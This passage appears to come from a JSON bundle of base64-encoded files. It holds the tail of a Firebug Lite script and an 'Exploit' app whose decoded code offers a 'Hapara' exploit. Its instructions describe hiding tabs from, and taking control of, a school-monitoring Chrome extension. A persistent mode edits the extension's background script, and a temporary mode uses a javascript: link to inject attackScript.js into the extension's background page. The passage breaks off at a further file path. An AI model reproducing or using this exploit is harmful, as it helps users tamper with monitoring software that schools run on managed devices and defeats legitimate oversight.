30ubG9nUm93e3Bvc2l0aW9uOnJlbGF0aXZlO2JvcmRlci1ib3R0b206MXB4IHNvbGlkICNEN0Q3RDc7cGFkZGluZzoycHggNHB4IDFweCA2cHg7emJhY2tncm91bmQtY29sb3I6I0ZGRkZGRjt9LmxvZ1Jvdy1jb21tYW5ke2ZvbnQtZmFtaWx5Ok1vbmFjbyxtb25vc3BhY2U7Y29sb3I6Ymx1ZTt9Lm9iamVjdEJveC1zdHJpbmcsLm9iamVjdEJveC10ZXh0LC5vYmplY3RCb3gtbnVtYmVyLC5vYmplY3RCb3gtZnVuY3Rpb24sLm9iamVjdExpbmstZWxlbWVudCwub2JqZWN0TGluay10ZXh0Tm9kZSwub2JqZWN0TGluay1mdW5jdGlvbiwub2JqZWN0Qm94LXN0YWNrVHJhY2UsLm9iamVjdExpbmstcHJvZmlsZXtmb250LWZhbWlseTpNb25hY28sbW9ub3NwYWNlO30ub2JqZWN0Qm94LW51bGx7cGFkZGluZzowIDJweDtib3JkZXI6MXB4IHNvbGlkICM2NjY2NjY7YmFja2dyb3VuZC1jb2xvcjojODg4ODg4O2NvbG9yOiNGRkZGRkY7fS5vYmplY3RCb3gtc3RyaW5ne2NvbG9yOnJlZDt9Lm9iamVjdEJveC1udW1iZXJ7Y29sb3I6IzAwMDA4ODt9Lm9iamVjdEJveC1mdW5jdGlvbntjb2xvcjpEYXJrR3JlZW47fS5vYmplY3RCb3gtb2JqZWN0e2NvbG9yOkRhcmtHcmVlbjtmb250LXdlaWdodDpib2xkO2ZvbnQtZmFtaWx5Okx1Y2lkYSBHcmFuZGUsc2Fucy1zZXJpZjt9Lm9iamVjdEJveC1hcnJheXtjb2xvcjojMDAwO30ubG9nUm93LWluZm8sLmxvZ1Jvdy1lcnJvciwubG9nUm93LXdhcm57YmFja2dyb3VuZDojZmZmIG5vLXJlcGVhdCAycHggMnB4O3BhZGRpbmctbGVmdDoyMHB4O3BhZGRpbmctYm90dG9tOjNweDt9LmxvZ1Jvdy1pbmZve2JhY2tncm91bmQtaW1hZ2U6dXJsKGh0dHBzOi8vZ2V0ZmlyZWJ1Zy5jb20vcmVsZWFzZXMvbGl0ZS9sYXRlc3Qvc2tpbi94cC9pbmZvSWNvbi5wbmcpICFpbXBvcnRhbnQ7YmFja2dyb3VuZC1pbWFnZTp1cmwoaHR0cHM6Ly9nZXRmaXJlYnVnLmNvbS9yZWxlYXNlcy9saXRlL2xhdGVzdC9za2luL3hwL2luZm9JY29uLmdpZik7fS5sb2dSb3ctd2FybntiYWNrZ3JvdW5kLWNvbG9yOmN5YW47YmFja2dyb3VuZC1pbWFnZTp1cmwoaHR0cHM6Ly9nZXRmaXJlYnVnLmNvbS9yZWxlYXNlcy9saXRlL2xhdGVzdC9za2luL3hwL3dhcm5pbmdJY29uLnBuZykgIWltcG9ydGFudDtiYWNrZ3JvdW5kLWltYWdlOnVybChodHRwczovL2dldGZpcmVidWcuY29tL3JlbGVhc2VzL2xpdGUvbGF0ZXN0L3NraW4veHAvd2FybmluZ0ljb24uZ2lmKTt9LmxvZ1Jvdy1lcnJvcntiYWNrZ3JvdW5kLWNvbG9yOkxpZ2h0WWVsbG93O2JhY2tncm91bmQtaW1hZ2U6dXJsKGh0dHBzOi8vZ2V0ZmlyZWJ1Zy5jb20vcmVsZWFzZXMvbGl0ZS9sYXRlc3Qvc2tpbi94cC9lcnJvckljb24ucG5nKSAhaW1wb3J0YW50O2JhY2tncm91bmQtaW1hZ2U6dXJsKGh0dHBzOi8vZ2V0ZmlyZWJ1Zy5jb20vcmVsZWFzZXMvbGl0ZS9sYXRlc3Qvc2tpbi94cC9lcnJvckljb24uZ2lmKTtjb2xvcjojZjAwO30uZXJyb3JNZXNzYWdle3ZlcnRpY2FsLWFsaWduOnRvcDtjb2xvcjojZjAwO30ub2JqZWN0Qm94LXNvdXJjZUxpbmt7cG9zaXRpb246YWJzb2x1dGU7cmlnaHQ6NHB4O3RvcDoycHg7cGFkZGluZy1sZWZ0OjhweDtmb250LWZhbWlseTpMdWNpZGEgR3JhbmRlLHNhbnMtc2VyaWY7Zm9udC13ZWlnaHQ6Ym9sZDtjb2xvcjojMDAwMEZGO30uc2VsZWN0b3JUYWcsLnNlbGVjdG9ySWQsLnNlbGVjdG9yQ2xhc3N7Zm9udC1mYW1pbHk6TW9uYWNvLG1vbm9zcGFjZTtmb250LXdlaWdodDpub3JtYWw7fS5zZWxlY3RvclRhZ3tjb2xvcjojMDAwMEZGO30uc2VsZWN0b3JJZHtjb2xvcjpEYXJrQmx1ZTt9LnNlbGVjdG9yQ2xhc3N7Y29sb3I6cmVkO30ub2JqZWN0Qm94LWVsZW1lbnR7Zm9udC1mYW1pbHk6TW9uYWNvLG1vbm9zcGFjZTtjb2xvcjojMDAwMDg4O30ubm9kZUNoaWxkcmVue3BhZGRpbmctbGVmdDoyNnB4O30ubm9kZVRhZ3tjb2xvcjpibHVlO2N1cnNvcjpwb2ludGVyO30ubm9kZVZhbHVle2NvbG9yOiNGRjAwMDA7Zm9udC13ZWlnaHQ6bm9ybWFsO30ubm9kZVRleHQsLm5vZGVDb21tZW50e21hcmdpbjowIDJweDt2ZXJ0aWNhbC1hbGlnbjp0b3A7fS5ub2RlVGV4dHtjb2xvcjojMzMzMzMzO2ZvbnQtZmFtaWx5Ok1vbmFjbyxtb25vc3BhY2U7fS5ub2RlQ29tbWVudHtjb2xvcjpEYXJrR3JlZW47fS5ub2RlSGlkZGVuLC5ub2RlSGlkZGVuICp7Y29sb3I6Izg4ODg4ODt9Lm5vZGVIaWRkZW4gLm5vZGVUYWd7Y29sb3I6IzVGODJEOTt9Lm5vZGVIaWRkZW4gLm5vZGVWYWx1ZXtjb2xvcjojRDg2MDYwO30uc2VsZWN0ZWRFbGVtZW50IC5ub2RlSGlkZGVuLC5zZWxlY3RlZEVsZW1lbnQgLm5vZGVIaWRkZW4gKntjb2xvcjpTa3lCbHVlICFpbXBvcnRhbnQ7fS5sb2ctb2JqZWN0e30ucHJvcGVydHl7cG9zaXRpb246cmVsYXRpdmU7Y2xlYXI6Ym90aDtoZWlnaHQ6MTVweDt9LnByb3BlcnR5TmFtZUNlbGx7dmVydGljYWwtYWxpZ246dG9wO2Zsb2F0OmxlZnQ7d2lkdGg6MjglO3Bvc2l0aW9uOmFic29sdXRlO2xlZnQ6MDt6LWluZGV4OjA7fS5wcm9wZXJ0eVZhbHVlQ2VsbHtmbG9hdDpyaWdodDt3aWR0aDo2OCU7YmFja2dyb3VuZDojZmZmO3Bvc2l0aW9uOmFic29sdXRlO3BhZGRpbmctbGVmdDo1cHg7ZGlzcGxheTp0YWJsZS1jZWxsO3JpZ2h0OjA7ei1pbmRleDoxO30ucHJvcGVydHlOYW1le2ZvbnQtd2VpZ2h0OmJvbGQ7fS5GaXJlYnVnUG9wdXB7aGVpZ2h0OjEwMCUgIWltcG9ydGFudDt9LkZpcmVidWdQb3B1cCAjZmJXaW5kb3dCdXR0b25ze2Rpc3BsYXk6bm9uZSAhaW1wb3J0YW50O30uRmlyZWJ1Z1BvcHVwICNmYkhTcGxpdHRlcntkaXNwbGF5Om5vbmUgIWltcG9ydGFudDt9JywNCiAgICBIVE1MOiAnPHRhYmxlIGlkPSJmYkNocm9tZSIgY2VsbHBhZGRpbmc9IjAiIGNlbGxzcGFjaW5nPSIwIiBib3JkZXI9IjAiPjx0Ym9keT48dHI+PHRkIGlkPSJmYlRvcCIgY29sc3Bhbj0iMiI+PGRpdiBpZD0iZmJXaW5kb3dCdXR0b25zIj48YSBpZD0iZmJXaW5kb3dfYnREZWFjdGl2YXRlIiBjbGFzcz0iZmJTbWFsbEJ1dHRvbiBmYkhvdmVyIiB0aXRsZT0iRGVhY3RpdmF0ZSBGaXJlYnVnIGZvciB0aGlzIHdlYiBwYWdlIj4mbmJzcDs8L2E+PGEgaWQ9ImZiV2luZG93X2J0RGV0YWNoIiBjbGFzcz0iZmJTbWFsbEJ1dHRvbiBmYkhvdmVyIiB0aXRsZT0iT3BlbiBGaXJlYnVnIGluIHBvcHVwIHdpbmRvdyI+Jm5ic3A7PC9hPjxhIGlkPSJmYldpbmRvd19idENsb3NlIiBjbGFzcz0iZmJTbWFsbEJ1dHRvbiBmYkhvdmVyIiB0aXRsZT0iTWluaW1pemUgRmlyZWJ1ZyI+Jm5ic3A7PC9hPjwvZGl2PjxkaXYgaWQ9ImZiVG9vbGJhciI+PGRpdiBpZD0iZmJUb29sYmFyQ29udGVudCI+PHNwYW4gaWQ9ImZiVG9vbGJhckljb24iPjxhIGlkPSJmYkZpcmVidWdCdXR0b24iIGNsYXNzPSJmYkljb25CdXR0b24iIGNsYXNzPSJmYkhvdmVyIiB0YXJnZXQ9Il9ibGFuayI+Jm5ic3A7PC9hPjwvc3Bhbj48c3BhbiBpZD0iZmJUb29sYmFyQnV0dG9ucyI+PHNwYW4gaWQ9ImZiRml4ZWRCdXR0b25zIj48YSBpZD0iZmJDaHJvbWVfYnRJbnNwZWN0IiBjbGFzcz0iZmJCdXR0b24gZmJIb3ZlciIgdGl0bGU9IkNsaWNrIGFuIGVsZW1lbnQgaW4gdGhlIHBhZ2UgdG8gaW5zcGVjdCI+SW5zcGVjdDwvYT48L3NwYW4+PHNwYW4gaWQ9ImZiQ29uc29sZUJ1dHRvbnMiIGNsYXNzPSJmYlRvb2xiYXJCdXR0b25zIj48YSBpZD0iZmJDb25zb2xlX2J0Q2xlYXIiIGNsYXNzPSJmYkJ1dHRvbiBmYkhvdmVyIiB0aXRsZT0iQ2xlYXIgdGhlIGNvbnNvbGUiPkNsZWFyPC9hPjwvc3Bhbj48L3NwYW4+PHNwYW4gaWQ9ImZiU3RhdHVzQmFyQm94Ij48c3BhbiBjbGFzcz0iZmJUb29sYmFyU2VwYXJhdG9yIj48L3NwYW4+PC9zcGFuPjwvZGl2PjwvZGl2PjxkaXYgaWQ9ImZiUGFuZWxCYXJCb3giPjxkaXYgaWQ9ImZiUGFuZWxCYXIxIiBjbGFzcz0iZmJQYW5lbEJhciI+PGEgaWQ9ImZiQ29uc29sZVRhYiIgY2xhc3M9ImZiVGFiIGZiSG92ZXIiPjxzcGFuIGNsYXNzPSJmYlRhYkwiPjwvc3Bhbj48c3BhbiBjbGFzcz0iZmJUYWJUZXh0Ij5Db25zb2xlPC9zcGFuPjxzcGFuIGNsYXNzPSJmYlRhYk1lbnVUYXJnZXQiPjwvc3Bhbj48c3BhbiBjbGFzcz0iZmJUYWJSIj48L3NwYW4+PC9hPjxhIGlkPSJmYkhUTUxUYWIiIGNsYXNzPSJmYlRhYiBmYkhvdmVyIj48c3BhbiBjbGFzcz0iZmJUYWJMIj48L3NwYW4+PHNwYW4gY2xhc3M9ImZiVGFiVGV4dCI+SFRNTDwvc3Bhbj48c3BhbiBjbGFzcz0iZmJUYWJSIj48L3NwYW4+PC9hPjxhIGNsYXNzPSJmYlRhYiBmYkhvdmVyIj48c3BhbiBjbGFzcz0iZmJUYWJMIj48L3NwYW4+PHNwYW4gY2xhc3M9ImZiVGFiVGV4dCI+Q1NTPC9zcGFuPjxzcGFuIGNsYXNzPSJmYlRhYlIiPjwvc3Bhbj48L2E+PGEgY2xhc3M9ImZiVGFiIGZiSG92ZXIiPjxzcGFuIGNsYXNzPSJmYlRhYkwiPjwvc3Bhbj48c3BhbiBjbGFzcz0iZmJUYWJUZXh0Ij5TY3JpcHQ8L3NwYW4+PHNwYW4gY2xhc3M9ImZiVGFiUiI+PC9zcGFuPjwvYT48YSBjbGFzcz0iZmJUYWIgZmJIb3ZlciI+PHNwYW4gY2xhc3M9ImZiVGFiTCI+PC9zcGFuPjxzcGFuIGNsYXNzPSJmYlRhYlRleHQiPkRPTTwvc3Bhbj48c3BhbiBjbGFzcz0iZmJUYWJSIj48L3NwYW4+PC9hPjwvZGl2PjxkaXYgaWQ9ImZiUGFuZWxCYXIyQm94IiBjbGFzcz0iaGlkZSI+PGRpdiBpZD0iZmJQYW5lbEJhcjIiIGNsYXNzPSJmYlBhbmVsQmFyIj48L2Rpdj48L2Rpdj48L2Rpdj48ZGl2IGlkPSJmYkhTcGxpdHRlciI+Jm5ic3A7PC9kaXY+PC90ZD48L3RyPjx0ciBpZD0iZmJDb250ZW50Ij48dGQgaWQ9ImZiUGFuZWxCb3gxIj48ZGl2IGlkPSJmYlBhbmVsMSIgY2xhc3M9ImZiRml0SGVpZ2h0Ij48ZGl2IGlkPSJmYkNvbnNvbGUiIGNsYXNzPSJmYlBhbmVsIj48L2Rpdj48ZGl2IGlkPSJmYkhUTUwiIGNsYXNzPSJmYlBhbmVsIj48L2Rpdj48L2Rpdj48L3RkPjx0ZCBpZD0iZmJQYW5lbEJveDIiIGNsYXNzPSJoaWRlIj48ZGl2IGlkPSJmYlZTcGxpdHRlciIgY2xhc3M9ImZiVlNwbGl0dGVyIj4mbmJzcDs8L2Rpdj48ZGl2IGlkPSJmYlBhbmVsMiIgY2xhc3M9ImZiRml0SGVpZ2h0Ij48ZGl2IGlkPSJmYkhUTUxfU3R5bGUiIGNsYXNzPSJmYlBhbmVsIj48L2Rpdj48ZGl2IGlkPSJmYkhUTUxfTGF5b3V0IiBjbGFzcz0iZmJQYW5lbCI+PC9kaXY+PGRpdiBpZD0iZmJIVE1MX0RPTSIgY2xhc3M9ImZiUGFuZWwiPjwvZGl2PjwvZGl2Pjx0ZXh0YXJlYSBpZD0iZmJMYXJnZUNvbW1hbmRMaW5lIiBjbGFzcz0iZmJGaXRIZWlnaHQiPjwvdGV4dGFyZWE+PGRpdiBpZD0iZmJMYXJnZUNvbW1hbmRCdXR0b25zIj48YSBpZD0iZmJDb21tYW5kX2J0UnVuIiBjbGFzcz0iZmJCdXR0b24gZmJIb3ZlciI+UnVuPC9hPjxhIGlkPSJmYkNvbW1hbmRfYnRDbGVhciIgY2xhc3M9ImZiQnV0dG9uIGZiSG92ZXIiPkNsZWFyPC9hPjxhIGlkPSJmYlNtYWxsQ29tbWFuZExpbmVJY29uIiBjbGFzcz0iZmJTbWFsbEJ1dHRvbiBmYkhvdmVyIj48L2E+PC9kaXY+PC90ZD48L3RyPjx0ciBpZD0iZmJCb3R0b20iIGNsYXNzPSJoaWRlIj48dGQgaWQ9ImZiQ29tbWFuZCIgY29sc3Bhbj0iMiI+PGRpdiBpZD0iZmJDb21tYW5kQm94Ij48ZGl2IGlkPSJmYkNvbW1hbmRJY29uIj4mZ3Q7Jmd0OyZndDs8L2Rpdj48aW5wdXQgaWQ9ImZiQ29tbWFuZExpbmUiIG5hbWU9ImZiQ29tbWFuZExpbmUiIHR5cGU9InRleHQiLz48YSBpZD0iZmJMYXJnZUNvbW1hbmRMaW5lSWNvbiIgY2xhc3M9ImZiU21hbGxCdXR0b24gZmJIb3ZlciI+PC9hPjwvZGl2PjwvdGQ+PC90cj48L3Rib2R5PjwvdGFibGU+PHNwYW4gaWQ9ImZiTWluaUNocm9tZSI+PHNwYW4gaWQ9ImZiTWluaUNvbnRlbnQiPjxzcGFuIGlkPSJmYk1pbmlJY29uIiB0aXRsZT0iT3BlbiBGaXJlYnVnIExpdGUiPjwvc3Bhbj48c3BhbiBpZD0iZmJNaW5pRXJyb3JzIiBjbGFzcz0iZmJFcnJvcnMiPjwvc3Bhbj48L3NwYW4+PC9zcGFuPicNCn07DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KfX0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCkZCTC5pbml0aWFsaXplKCk7DQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KfSkoKTs=", "/system/app/Exploit/script/app.js": "KGZ1bmN0aW9uKCkgew0KICAndXNlIHN0cmljdCc7DQogIHZhciBtb2RlbDsNCiAgdmFyIGNvbnRyb2xsZXI7DQogIHZhciB2aWV3Ow0KICBtb2RlbCA9IHsNCiAgICBleHBsb2l0czogW3sNCiAgICAgIHRpdGxlOiAnSGFwYXJhJywNCiAgICAgIGNhbGxiYWNrOiBmdW5jdGlvbihpbnN0cnVjdGlvbnMpIHsNCiAgICAgICAgaW5zdHJ1Y3Rpb25zWzRdLmlubmVySFRNTCArPSAnPGEgaHJlZj0iRXhwbG9pdHMvSGFwYXJhL2F0dGFja1NjcmlwdC5qcyI+dGhpczwvYT4gYXQgdGhlIGJlZ2luaW5nIG9mIHRoZSBmaWxlLic7DQogICAgICAgIGluc3RydWN0aW9uc1s1XS5pbm5lckhUTUwgKz0gJzxhIGhyZWY9ImNocm9tZS1leHRlbnNpb246Ly9rYm9oYWZjb3BmcGlna2pkaW1kY2RnZW5saGttaGJuYy9ibG9ja2VkLmh0bWwiPnRoaXM8L2E+JzsNCiAgICAgICAgaW5zdHJ1Y3Rpb25zWzVdLmlubmVySFRNTCArPSAnIGluIGEgbmV3IHRhYiwgYW5kIHRoZW4gZHJhZyAnOw0KICAgICAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2EnKTsNCiAgICAgICAgYS5zZXRBdHRyaWJ1dGUoJ2hyZWYnLCBgamF2YXNjcmlwdDoNCiAgICAgICAgICBjaHJvbWUuZXh0ZW5zaW9uLmdldEJhY2tncm91bmRQYWdlKCkubG9jYXRpb24gPSAibWFuaWZlc3QuanNvbiI7DQogICAgICAgICAgbmF2aWdhdG9yLndlYmtpdFBlcnNpc3RlbnRTdG9yYWdlLnJlcXVlc3RRdW90YSgxMDI0ICogMTAyNCAqIDEwMjQsDQogICAgICAgICAgICBmdW5jdGlvbihncmFudGVkQnl0ZXMpIHsNCiAgICAgICAgICAgICAgd2Via2l0UmVxdWVzdEZpbGVTeXN0ZW0oUEVSU0lTVEVOVCwgZ3JhbnRlZEJ5dGVzLA0KICAgICAgICAgICAgICBmdW5jdGlvbihmaWxlU3lzdGVtKSB7DQogICAgICAgICAgICAgICAgZmlsZVN5c3RlbS5yb290LmdldEZpbGUoJ2F0dGFja1NjcmlwdC5qcycsIHtjcmVhdGU6IHRydWUsIGV4Y2x1c2l2ZTogZmFsc2V9LCBmdW5jdGlvbihmaWxlKSB7DQogICAgICAgICAgICAgICAgICBmaWxlLnJlbW92ZShmdW5jdGlvbigpIHsNCiAgICAgICAgICAgICAgICAgICAgdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOw0KICAgICAgICAgICAgICAgICAgICB4aHIub3BlbignR0VUJywgJ2ZpbGVzeXN0ZW06YCArIGxvY2F0aW9uLm9yaWdpbiArIGAvcGVyc2lzdGVudC9zeXN0ZW0vYXBwL0V4cGxvaXQvRXhwbG9pdHMvSGFwYXJhL2F0dGFja1NjcmlwdC5qcycsIHRydWUpOw0KICAgICAgICAgICAgICAgICAgICB4aHIucmVzcG9uc2VUeXBlID0gJ2Jsb2InOw0KICAgICAgICAgICAgICAgICAgICB4aHIuYWRkRXZlbnRMaXN0ZW5lcignbG9hZCcsIGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgICAgICAgICAgIGZpbGVTeXN0ZW0ucm9vdC5nZXRGaWxlKCdhdHRhY2tTY3JpcHQuanMnLCB7Y3JlYXRlOiB0cnVlfSwgZnVuY3Rpb24oZmlsZSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgZmlsZS5jcmVhdGVXcml0ZXIoZnVuY3Rpb24oZmlsZUNvbnRlbnQpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZUNvbnRlbnQud3JpdGUoeGhyLnJlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHdpbiA9IGNocm9tZS5leHRlbnNpb24uZ2V0QmFja2dyb3VuZFBhZ2UoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgd2luLmhpU2NyaXB0ID0gd2luLmRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICB3aW4uaGlTY3JpcHQuc3JjID0gJ2ZpbGVzeXN0ZW06JyArIGxvY2F0aW9uLm9yaWdpbiArICcvcGVyc2lzdGVudC9hdHRhY2tTY3JpcHQuanMnOw0KICAgICAgICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbi5kb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHdpbi5oaVNjcmlwdCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgIH0uYmluZCh0aGlzKSwgMTAwKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgICAgICAgIH0sIGZ1bmN0aW9uKGVycikgew0KICAgICAgICAgICAgICAgICAgICAgICAgYWxlcnQoJ1VuYWJsZSB0byBjcmVhdGUgYXR0YWNrU2NyaXB0LmpzOyAnICsgZXJyKTsNCiAgICAgICAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgICAgIHhoci5zZW5kKCk7DQogICAgICAgICAgICAgICAgICB9LCBmdW5jdGlvbihlcnIpIHsNCiAgICAgICAgICAgICAgICAgICAgYWxlcnQoJ1VuYWJsZSB0byBkZWxldGUgYXR0YWNrU2NyaXB0LmpzOyAnICsgZXJyKTsNCiAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgIH0sIGZ1bmN0aW9uKGVycikgew0KICAgICAgICAgICAgICAgICAgYWxlcnQoJ1VuYWJsZSB0byBnZXQgYXR0YWNrU2NyaXB0LmpzOyAnICsgZXJyKTsNCiAgICAgICAgICAgICAgICB9KQ0KICAgICAgICAgICAgICB9LCBmdW5jdGlvbihlcnIpIHsNCiAgICAgICAgICAgICAgICBhbGVydCgnZmlsZVN5c3RlbS5qczogQ2Fubm90IGdldCBGaWxlIFN5c3RlbS4nICsgZXJyKTsNCiAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICB9LCBmdW5jdGlvbihlcnIpIHsNCiAgICAgICAgICAgICAgYWxlcnQoJ2ZpbGVTeXN0ZW0uanM6IENhbm5vdCByZXF1ZXN0IEZpbGUgU3lzdGVtLicgKyBlcnIpOw0KICAgICAgICAgICAgfSk7DQogICAgICAgIGApOw0KICAgICAgICBhLmlubmVyVGV4dCA9ICd0aGlzJzsNCiAgICAgICAgaW5zdHJ1Y3Rpb25zWzVdLmFwcGVuZENoaWxkKGEpOw0KICAgICAgICBpbnN0cnVjdGlvbnNbNV0uaW5uZXJIVE1MICs9ICcgdG8gdGhlIHRvcCBvZiB0aGF0IHRhYi4nOw0KICAgICAgfSwNCiAgICAgIGluc3RydWN0aW9uczogWw0KICAgICAgICAnVGhpcyBleHBsb2l0IGFsbG93cyB5b3UgdG8gaGlkZSB0YWJzIGFuZCBjb21wbGV0ZWx5IGNvbnRyb2wgSGFwYXJhLicsDQogICAgICAgICcxLiBQZXJzaXN0ZW50IE1vZGUuIFRoaXMgd2lsbCBXb3JrIHNlbWktcGVybWFuZW50bHksIHdpdGggdGhlIGV4Y2VwdGlvbiBvZiBmYWN0b3J5IHJlc2V0cyBhbmQgYWNjb3VudCByZXNldHMuIFlvdSB3aWxsIG5lZWQgc2hlbGwgYWNjZXNzLicsDQogICAgICAgICcyLiBUZW1wb3JhcnkgTW9kZS4gVGhpcyB3aWxsIG9ubHkgd29yayB1bnRpbCB5b3UgbG9nIG91dCBvciBzaHV0IGRvd24geW91ciBDaHJvbWVCb29rLiBZb3Ugc2hvdWxkIGJlIGZpbmUgaWYgeW91IGp1c3QgY2xvc2UgdGhpcyBsaWQsIHRob3VnaC4nLA0KICAgICAgICAnJywNCiAgICAgICAgJ1RvIEVuYWJsZSBwZXJzaXN0ZW50IG1vZGUsIG5hdmlnYXRlIHRvIH4vRXh0ZW5zaW9ucy9rYm9oYWZjb3BmcGlna2pkaW1kY2RnZW5saGttaGJuYy8yLngueC93ZWJwYWNrL2JhY2tncm91bmQtKi5qcywgYW5kIGluc2VydCAnLA0KICAgICAgICAnVG8gRW5hYmxlIHRlbXBvcmFyeSBtb2RlLCBvcGVuICcNCiAgICAgIF0NCiAgICB9XSwNCiAgICBpbml0OiBmdW5jdGlvbigpIHsNCiAgICAgIGZvciAobGV0IGkgPSAwLCBpaSA9IHRoaXMuZXhwbG9pdHMubGVuZ3RoOyBpICE9IGlpOyBpKyspIHsNCiAgICAgICAgY29udHJvbGxlci5uZXdDb250ZW50KHRoaXMuZXhwbG9pdHNbaV0pOw0KICAgICAgfQ0KICAgIH0NCiAgfTsNCiAgY29udHJvbGxlciA9IHsNCiAgICBpbml0OiBmdW5jdGlvbigpIHsNCiAgICAgIG1vZGVsLmluaXQoKTsNCiAgICAgIHZpZXcuaW5pdCgpOw0KICAgIH0sDQogICAgbmV3Q29udGVudDogZnVuY3Rpb24ob3B0aW9ucykgew0KICAgICAgdmlldy5uZXdDb250ZW50KG9wdGlvbnMpOw0KICAgIH0NCiAgfTsNCiAgdmlldyA9IHsNCiAgICBpbml0OiBmdW5jdGlvbigpIHsNCiAgICB9LA0KICAgIG5ld0NvbnRlbnQ6IGZ1bmN0aW9uKHBhcmFtcykgew0KICAgICAgdmFyIGV4cGxvaXRHcm91cCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICAgICAgZXhwbG9pdEdyb3VwLmNsYXNzTmFtZSA9ICdleHBsb2l0R3JvdXAnOw0KICAgICAgdmFyIGV4cGxvaXRMYWJlbCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICAgICAgZXhwbG9pdExhYmVsLmNsYXNzTmFtZSA9ICdleHBsb2l0TGFiZWwnOw0KICAgICAgdmFyIGRyb3BEb3duID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaW1nJyk7DQogICAgICBkcm9wRG93bi5jbGFzc05hbWUgPSAnZHJvcGRvd24nOw0KICAgICAgZHJvcERvd24uc3JjID0gJ3Jlcy9kcmF3YWJsZS9kcm9wZG93bi5zdmcnOw0KICAgICAgZXhwbG9pdExhYmVsLmFwcGVuZENoaWxkKGRyb3BEb3duKTsNCiAgICAgIHZhciB0aXRsZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICAgICAgdGl0bGUuY2xhc3NOYW1lID0gJ3RpdGxlJzsNCiAgICAgIHRpdGxlLmlubmVyVGV4dCA9IHBhcmFtcy50aXRsZTsNCiAgICAgIGV4cGxvaXRMYWJlbC5hcHBlbmRDaGlsZCh0aXRsZSk7DQogICAgICBleHBsb2l0TGFiZWwuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbigpIHsNCiAgICAgICAgaWYgKGV4cGxvaXRHcm91cC5leHBhbmRlZCkgew0KICAgICAgICAgIC8qQ29sbGFwc2UgZ3JvdXAqLw0KICAgICAgICAgIGV4cGxvaXRHcm91cC5leHBhbmRlZCA9IGZhbHNlOw0KICAgICAgICAgIGV4cGxvaXRHcm91cC5jbGFzc05hbWUgPSAnZXhwbG9pdEdyb3VwJzsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAvKkV4cGFuZCBncm91cCovDQogICAgICAgICAgZXhwbG9pdEdyb3VwLmV4cGFuZGVkID0gdHJ1ZTsNCiAgICAgICAgICBleHBsb2l0R3JvdXAuY2xhc3NOYW1lID0gJ2V4cGxvaXRHcm91cCBhY3RpdmUnOw0KICAgICAgICB9DQogICAgICB9LmJpbmQodGhpcykpOw0KICAgICAgZXhwbG9pdEdyb3VwLmFwcGVuZENoaWxkKGV4cGxvaXRMYWJlbCk7DQogICAgICB2YXIgZXhwbG9pdEJvZHkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICAgIGV4cGxvaXRCb2R5LmNsYXNzTmFtZSA9ICdleHBsb2l0Qm9keSc7DQogICAgICBmb3IgKGxldCBpID0gMCwgaWkgPSBwYXJhbXMuaW5zdHJ1Y3Rpb25zLmxlbmd0aDsgaSAhPSBpaTsgaSsrKSB7DQogICAgICAgIGxldCBpbnN0cnVjdGlvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3AnKTsNCiAgICAgICAgaW5zdHJ1Y3Rpb24uY2xhc3NOYW1lID0gJ2luc3RydWN0aW9ucyc7DQogICAgICAgIGluc3RydWN0aW9uLmlubmVyVGV4dCA9IHBhcmFtcy5pbnN0cnVjdGlvbnNbaV07DQogICAgICAgIGV4cGxvaXRCb2R5LmFwcGVuZENoaWxkKGluc3RydWN0aW9uKTsNCiAgICAgIH0NCiAgICAgIGV4cGxvaXRHcm91cC5hcHBlbmRDaGlsZChleHBsb2l0Qm9keSk7DQogICAgICBleHBsb2l0R3JvdXAuZXhwYW5kZWQgPSBmYWxzZTsNCiAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZXhwbG9pdEdyb3VwKTsNCiAgICAgIHBhcmFtcy5jYWxsYmFjayhleHBsb2l0Qm9keS5jaGlsZHJlbik7DQogICAgfQ0KICB9Ow0KICBjb250cm9sbGVyLmluaXQoKTsNCn0pKCk7DQo=", "/system/res/drawable/repeat.svg": 